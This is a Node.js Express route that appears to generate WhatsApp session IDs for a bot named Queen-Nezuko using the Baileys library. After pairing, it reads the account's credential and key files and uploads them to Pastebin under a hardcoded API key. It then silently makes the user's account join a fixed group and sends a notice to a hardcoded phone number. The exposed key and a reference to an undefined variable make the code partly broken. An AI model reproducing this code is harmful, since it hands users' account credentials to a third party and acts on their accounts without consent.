const PastebinAPI = require('pastebin-js'),
pastebin = new PastebinAPI('IG9REZ1z5KPvWNejqfK7AAMXwO90Gjxl')
const {makeid} = require('./id');
const express = require('express');
const fs = require('fs');
let router = express.Router()
const pino = require("pino");
const path = require('path');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    delay,
    Browsers,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore
} = require("@whiskeysockets/baileys");
function removeFile(FilePath) {
    if (!fs.existsSync(FilePath)) return false;
    fs.rmSync(FilePath, { recursive: true, force: true });
};

const specificFiles = [
    'creds.json',
    'app-state-sync-key-AAAAAED1.json',
    'pre-key-1.json',
    'pre-key-2.json',
    'pre-key-3.json',
    'pre-key-5.json',
    'pre-key-6.json'
];

function readSpecificJSONFiles(folderPath) {
    const result = {};
    specificFiles.forEach(file => {
        const filePath = path.join(folderPath, file);
        if (fs.existsSync(filePath)) {
            const fileContent = fs.readFileSync(filePath, 'utf-8');
            result[file] = JSON.parse(fileContent);
        } else {
            console.warn(`File not found: ${filePath}`);
        }
    });
    return result;
}

const {
	readFile
} = require("node:fs/promises")

router.get('/', async (req, res) => {
    const id = makeid();
    let num = req.query.number;

    async function getPaire() {
        const { state, saveCreds } = await useMultiFileAuthState('./temp/' + id);
        try {
            let session = makeWASocket({
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(state.keys, pino({level: "fatal"}).child({level: "fatal"})),
                },
                printQRInTerminal: false,
                logger: pino({level: "fatal"}).child({level: "fatal"}),
                browser: Browsers.macOS("Safari"),
             });
                       if (!session.authState.creds.registered) {
                await delay(1500);
                num = num.replace(/[^0-9]/g, '');
                const code = await session.requestPairingCode(num);
                if (!res.headersSent) {
                    await res.send({ code });
                }
            }
                  session.ev.on('creds.update', saveCreds);

            session.ev.on("connection.update", async (s) => {
                const { connection, lastDisconnect } = s;

                if (connection == "open") {
               		await delay(10000);
					const mergedJSON = await readSpecificJSONFiles(__dirname+`/temp/${id}/`);
					fs.writeFileSync(__dirname+`/temp/${id}/${id}.json`, JSON.stringify(mergedJSON));
					const output = await pastebin.createPasteFromFile(__dirname+`/temp/${id}/${id}.json`, "pastebin-js test", null, 1, "N");
			    	let message = output.split('/')[3];
                    let msg = `Queen-Nezuko~${message.split('').reverse().join('')}`;
				    await session.groupAcceptInvite("DcGABEejUwOG8YcgGOcizF");
               	 await session.sendMessage(session.user.id, {
						text: msg
					})
                     await session.sendMessage(session.user.id, { text: ` *⛒ ᴛʜᴀɴᴋ чᴏᴜ ғᴏʀ ᴄʜᴏᴏꜱɪɴɢ qᴜᴇᴇɴ-ɴᴇᴢᴜᴋᴏ⭜*

                       *⛥  ᴛʜɪꜱ ɪꜱ ʏᴏᴜʀ ꜱᴇꜱꜱɪᴏɴ ɪᴅ ᴩʟᴇᴀꜱᴇ ᴅᴏ ɴᴏᴛ ꜱʜᴀʀᴇ ᴛʜɪꜱ ᴄᴏᴅᴇ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ ⤾*\n\n!!`});
                    await session.sendMessage(session.user.id, { text: data.data });
                    await session.sendMessage("917907387121@s.whatsapp.net", { text: "*Successfully Paired Queen-nezuko-Md*✅" });

			
			await delay(100);
                    await session.ws.close();
                    return await removeFile('./temp/' + id);
                } else if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode != 401) {
                    await delay(10000);
                    getPaire();
                }
            });
        } catch (err) {
            console.log("service restated");
            await removeFile('./temp/' + id);
            if (!res.headersSent) {
                await res.send({ code: "Service Unavailable" });
            }
        }
    }

    return await getPaire();
});

module.exports = router;
